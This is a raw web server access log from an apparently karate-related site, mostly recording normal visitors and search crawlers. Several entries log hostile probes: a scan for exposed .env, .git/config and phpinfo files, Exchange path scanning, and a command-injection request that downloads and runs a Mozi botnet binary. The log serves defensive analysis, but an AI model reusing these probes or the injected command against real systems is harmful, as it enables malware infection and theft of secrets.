::ffff:174.194.143.203 - - [08/Oct/2022:20:17:48 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "http://wadokikai.org/resources" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/101.0.4951.58 Mobile/15E148 Safari/604.1"
::ffff:174.194.143.203 - - [08/Oct/2022:20:18:37 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "http://wadokikai.org/resources" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/101.0.4951.58 Mobile/15E148 Safari/604.1"
::ffff:174.194.143.203 - - [08/Oct/2022:20:18:44 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "http://wadokikai.org/resources" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/101.0.4951.58 Mobile/15E148 Safari/604.1"
::ffff:174.194.143.203 - - [08/Oct/2022:20:18:47 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "http://wadokikai.org/resources" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/101.0.4951.58 Mobile/15E148 Safari/604.1"
::ffff:174.194.143.203 - - [08/Oct/2022:20:18:53 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "http://wadokikai.org/resources" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/101.0.4951.58 Mobile/15E148 Safari/604.1"
::ffff:174.194.143.203 - - [08/Oct/2022:20:18:57 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "http://wadokikai.org/resources" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/101.0.4951.58 Mobile/15E148 Safari/604.1"
::ffff:174.194.143.203 - - [08/Oct/2022:20:19:00 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "http://wadokikai.org/resources" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/101.0.4951.58 Mobile/15E148 Safari/604.1"
::ffff:13.66.246.180 - - [08/Oct/2022:20:21:25 +0000] "GET /.git/config HTTP/1.1" 404 150 "-" "python-requests/2.28.1"
::ffff:13.66.246.180 - - [08/Oct/2022:20:21:25 +0000] "GET /.env.prod HTTP/1.1" 404 148 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
::ffff:13.66.246.180 - - [08/Oct/2022:20:21:25 +0000] "POST /.env.prod HTTP/1.1" 404 149 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
::ffff:13.66.246.180 - - [08/Oct/2022:20:21:31 +0000] "GET /.env.old HTTP/1.1" 404 147 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
::ffff:13.66.246.180 - - [08/Oct/2022:20:21:31 +0000] "POST /.env.old HTTP/1.1" 404 148 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
::ffff:13.66.246.180 - - [08/Oct/2022:20:21:33 +0000] "GET /.env.save HTTP/1.1" 404 148 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
::ffff:13.66.246.180 - - [08/Oct/2022:20:21:33 +0000] "POST /.env.save HTTP/1.1" 404 149 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
::ffff:174.194.143.203 - - [08/Oct/2022:20:21:35 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "http://wadokikai.org/resources" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/101.0.4951.58 Mobile/15E148 Safari/604.1"
::ffff:13.66.246.180 - - [08/Oct/2022:20:21:35 +0000] "GET /back/.env HTTP/1.1" 404 148 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
::ffff:13.66.246.180 - - [08/Oct/2022:20:21:35 +0000] "POST /back/.env HTTP/1.1" 404 149 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
::ffff:13.66.246.180 - - [08/Oct/2022:20:21:40 +0000] "GET /api/.env HTTP/1.1" 404 147 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
::ffff:13.66.246.180 - - [08/Oct/2022:20:21:40 +0000] "POST /api/.env HTTP/1.1" 404 148 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
::ffff:174.194.143.203 - - [08/Oct/2022:20:21:46 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "http://wadokikai.org/resources" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/101.0.4951.58 Mobile/15E148 Safari/604.1"
::ffff:13.66.246.180 - - [08/Oct/2022:20:21:46 +0000] "GET /sources/.env HTTP/1.1" 404 151 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
::ffff:13.66.246.180 - - [08/Oct/2022:20:21:46 +0000] "POST /sources/.env HTTP/1.1" 404 152 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
::ffff:13.66.246.180 - - [08/Oct/2022:20:21:49 +0000] "GET /enviroments/.env HTTP/1.1" 404 155 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
::ffff:13.66.246.180 - - [08/Oct/2022:20:21:49 +0000] "POST /enviroments/.env HTTP/1.1" 404 156 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
::ffff:13.66.246.180 - - [08/Oct/2022:20:21:53 +0000] "GET /.env.production HTTP/1.1" 404 154 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
::ffff:13.66.246.180 - - [08/Oct/2022:20:21:53 +0000] "POST /.env.production HTTP/1.1" 404 155 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
::ffff:13.66.246.180 - - [08/Oct/2022:20:21:55 +0000] "GET /shared/.env HTTP/1.1" 404 150 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
::ffff:13.66.246.180 - - [08/Oct/2022:20:21:55 +0000] "POST /shared/.env HTTP/1.1" 404 151 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
::ffff:13.66.246.180 - - [08/Oct/2022:20:21:57 +0000] "GET /development/.env HTTP/1.1" 404 155 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
::ffff:13.66.246.180 - - [08/Oct/2022:20:21:57 +0000] "POST /development/.env HTTP/1.1" 404 156 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
::ffff:13.66.246.180 - - [08/Oct/2022:20:22:05 +0000] "GET /enviroments/.env.production HTTP/1.1" 404 166 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
::ffff:13.66.246.180 - - [08/Oct/2022:20:22:05 +0000] "POST /enviroments/.env.production HTTP/1.1" 404 167 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
::ffff:13.66.246.180 - - [08/Oct/2022:20:22:17 +0000] "GET /docker/.env HTTP/1.1" 404 150 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
::ffff:13.66.246.180 - - [08/Oct/2022:20:22:17 +0000] "POST /docker/.env HTTP/1.1" 404 151 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
::ffff:13.66.246.180 - - [08/Oct/2022:20:22:19 +0000] "GET /.env.project HTTP/1.1" 404 151 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
::ffff:13.66.246.180 - - [08/Oct/2022:20:22:19 +0000] "POST /.env.project HTTP/1.1" 404 152 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
::ffff:13.66.246.180 - - [08/Oct/2022:20:22:21 +0000] "GET /rest/.env HTTP/1.1" 404 148 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
::ffff:13.66.246.180 - - [08/Oct/2022:20:22:21 +0000] "POST /rest/.env HTTP/1.1" 404 149 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
::ffff:13.66.246.180 - - [08/Oct/2022:20:22:23 +0000] "GET /admin-app/.env HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
::ffff:13.66.246.180 - - [08/Oct/2022:20:22:23 +0000] "POST /admin-app/.env HTTP/1.1" 404 154 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
::ffff:13.66.246.180 - - [08/Oct/2022:20:22:28 +0000] "GET /script/.env HTTP/1.1" 404 150 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
::ffff:13.66.246.180 - - [08/Oct/2022:20:22:28 +0000] "POST /script/.env HTTP/1.1" 404 151 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
::ffff:13.66.246.180 - - [08/Oct/2022:20:22:32 +0000] "GET /cp/.env HTTP/1.1" 404 146 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
::ffff:13.66.246.180 - - [08/Oct/2022:20:22:32 +0000] "POST /cp/.env HTTP/1.1" 404 147 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
::ffff:13.66.246.180 - - [08/Oct/2022:20:22:34 +0000] "GET /private/.env HTTP/1.1" 404 151 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
::ffff:13.66.246.180 - - [08/Oct/2022:20:22:35 +0000] "POST /private/.env HTTP/1.1" 404 152 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
::ffff:13.66.246.180 - - [08/Oct/2022:20:22:37 +0000] "GET /system/.env HTTP/1.1" 404 150 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
::ffff:13.66.246.180 - - [08/Oct/2022:20:22:37 +0000] "POST /system/.env HTTP/1.1" 404 151 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
::ffff:13.66.246.180 - - [08/Oct/2022:20:22:42 +0000] "GET /laravel/.env HTTP/1.1" 404 151 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
::ffff:13.66.246.180 - - [08/Oct/2022:20:22:42 +0000] "POST /laravel/.env HTTP/1.1" 404 152 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
::ffff:13.66.246.180 - - [08/Oct/2022:20:22:44 +0000] "GET /application/.env HTTP/1.1" 404 155 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
::ffff:13.66.246.180 - - [08/Oct/2022:20:22:44 +0000] "POST /application/.env HTTP/1.1" 404 156 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
::ffff:13.66.246.180 - - [08/Oct/2022:20:22:46 +0000] "GET /.env.development HTTP/1.1" 404 155 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
::ffff:13.66.246.180 - - [08/Oct/2022:20:22:46 +0000] "POST /.env.development HTTP/1.1" 404 156 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
::ffff:13.66.246.180 - - [08/Oct/2022:20:22:49 +0000] "GET /fedex/.env HTTP/1.1" 404 149 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
::ffff:13.66.246.180 - - [08/Oct/2022:20:22:49 +0000] "POST /fedex/.env HTTP/1.1" 404 150 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
::ffff:13.66.246.180 - - [08/Oct/2022:20:22:53 +0000] "GET /local/.env HTTP/1.1" 404 149 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
::ffff:13.66.246.180 - - [08/Oct/2022:20:22:53 +0000] "POST /local/.env HTTP/1.1" 404 150 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
::ffff:13.66.246.180 - - [08/Oct/2022:20:22:55 +0000] "GET /app/.env HTTP/1.1" 404 147 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
::ffff:13.66.246.180 - - [08/Oct/2022:20:22:55 +0000] "POST /app/.env HTTP/1.1" 404 148 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
::ffff:13.66.246.180 - - [08/Oct/2022:20:22:58 +0000] "GET /apps/.env HTTP/1.1" 404 148 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
::ffff:13.66.246.180 - - [08/Oct/2022:20:22:58 +0000] "GET /frontend_dev.php/$ HTTP/1.1" 404 157 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
::ffff:13.66.246.180 - - [08/Oct/2022:20:23:00 +0000] "GET /debug/default/view?panel=config HTTP/1.1" 404 157 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
::ffff:13.66.246.180 - - [08/Oct/2022:20:23:02 +0000] "GET /config.json HTTP/1.1" 404 150 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
::ffff:13.66.246.180 - - [08/Oct/2022:20:23:04 +0000] "GET /.json HTTP/1.1" 404 144 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
::ffff:13.66.246.180 - - [08/Oct/2022:20:23:11 +0000] "GET /?phpinfo=1 HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
::ffff:13.66.246.180 - - [08/Oct/2022:20:23:13 +0000] "GET /_profiler/phpinfo HTTP/1.1" 404 156 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
::ffff:13.66.246.180 - - [08/Oct/2022:20:23:18 +0000] "GET /info.php HTTP/1.1" 404 147 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
::ffff:13.66.246.180 - - [08/Oct/2022:20:23:22 +0000] "GET /phpinfo.php HTTP/1.1" 404 150 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
::ffff:37.139.53.82 - - [08/Oct/2022:20:27:53 +0000] "GET / HTTP/1.0" 200 58140 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.0 Safari/537.36"
::ffff:37.139.53.82 - - [08/Oct/2022:20:27:54 +0000] "POST /sendemail HTTP/1.0" 302 40 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.0 Safari/537.36"
::ffff:37.139.53.82 - - [08/Oct/2022:20:27:54 +0000] "GET /?err=error HTTP/1.0" 200 58692 "http://wadokikai.org/?err=error#signup" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.0 Safari/537.36"
::ffff:157.55.39.228 - - [08/Oct/2022:20:31:23 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:114.119.151.192 - - [08/Oct/2022:20:46:56 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:40.77.167.70 - - [08/Oct/2022:20:58:20 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:114.119.128.108 - - [08/Oct/2022:21:00:11 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:157.55.39.61 - - [08/Oct/2022:21:03:41 +0000] "GET /images/igpic.webp HTTP/1.1" 200 1328 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
::ffff:192.241.217.209 - - [08/Oct/2022:21:05:06 +0000] "GET /owa/auth/x.js HTTP/1.1" 404 152 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:192.241.220.110 - - [08/Oct/2022:21:05:29 +0000] "GET /owa/auth/logon.aspx HTTP/1.1" 404 158 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:192.241.216.172 - - [08/Oct/2022:21:06:25 +0000] "GET /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application HTTP/1.1" 404 214 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:135.125.246.189 - - [08/Oct/2022:21:06:52 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.246.189 - - [08/Oct/2022:21:06:53 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:114.119.152.128 - - [08/Oct/2022:21:08:03 +0000] "GET /contact?s=1&ss=4 HTTP/1.1" 200 9997 "http://www.wadokikai.org/" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:114.119.145.205 - - [08/Oct/2022:21:14:40 +0000] "GET /contact?s=1&ss=4 HTTP/1.1" 200 9997 "http://34.212.47.6/" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:157.55.39.207 - - [08/Oct/2022:21:41:32 +0000] "GET /images/books/karatedojo.jpg HTTP/1.1" 200 3457 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:66.249.79.231 - - [08/Oct/2022:21:45:08 +0000] "GET /ads.txt HTTP/1.1" 404 146 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.79.230 - - [08/Oct/2022:21:45:08 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.79.234 - - [08/Oct/2022:21:45:08 +0000] "GET /ads.txt HTTP/1.1" 404 146 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:135.125.246.189 - - [08/Oct/2022:21:48:50 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.246.189 - - [08/Oct/2022:21:48:50 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:34.203.212.20 - - [08/Oct/2022:21:57:40 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (Windows NT 6.2;en-US) AppleWebKit/537.32.36 (KHTML, live Gecko) Chrome/57.0.3014.80 Safari/537.32"
::ffff:188.166.2.31 - - [08/Oct/2022:22:28:18 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:207.46.13.135 - - [08/Oct/2022:22:29:24 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
::ffff:185.191.171.10 - - [08/Oct/2022:22:34:36 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
::ffff:185.191.171.8 - - [08/Oct/2022:22:34:37 +0000] "GET /contact?s=1&ss=7 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
::ffff:181.214.206.161 - - [08/Oct/2022:22:42:42 +0000] "HEAD / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1500.55 Safari/537.36"
::ffff:112.94.99.230 - - [08/Oct/2022:22:45:21 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1" 404 144 "-" "Hello, world"
::ffff:84.232.210.27 - - [08/Oct/2022:22:45:46 +0000] "GET / HTTP/1.1" 200 58140 "https://wadokikai.org" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36"
::ffff:54.36.148.220 - - [08/Oct/2022:22:45:54 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.12 - - [08/Oct/2022:22:45:55 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.13 - - [08/Oct/2022:22:45:58 +0000] "GET /images/schools/harborbaykaratedomap.jpg HTTP/1.1" 200 37245 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.7 - - [08/Oct/2022:22:45:59 +0000] "GET /images/schools/corpuzkaratedomap.jpg HTTP/1.1" 200 36421 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.7 - - [08/Oct/2022:22:45:59 +0000] "GET /images/wkkpatch22_med.png HTTP/1.1" 200 32301 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.14 - - [08/Oct/2022:22:46:00 +0000] "GET /images/schools/orindakaratedomap.jpg HTTP/1.1" 200 34167 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.2 - - [08/Oct/2022:22:46:01 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.15 - - [08/Oct/2022:22:46:01 +0000] "GET /images/schools/earhartkaratedomap.jpg HTTP/1.1" 200 41366 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.17 - - [08/Oct/2022:22:46:02 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.10 - - [08/Oct/2022:22:46:02 +0000] "GET /images/schools/martinezkaratedomap.jpg HTTP/1.1" 200 37724 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.16 - - [08/Oct/2022:22:46:03 +0000] "GET /images/schools/marinkaratedomap.jpg HTTP/1.1" 200 32400 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.2 - - [08/Oct/2022:22:46:03 +0000] "GET /images/schools/manzanitakaratedomap.jpg HTTP/1.1" 200 55402 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.5 - - [08/Oct/2022:22:46:04 +0000] "GET /images/schools/dcakaratedomap.jpg HTTP/1.1" 200 35262 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.19 - - [08/Oct/2022:22:46:04 +0000] "GET /images/schools/nunleykaratedomap.jpg HTTP/1.1" 200 42667 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.18 - - [08/Oct/2022:22:46:05 +0000] "GET /images/schools/alamedakaratedomap.jpg HTTP/1.1" 200 38311 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
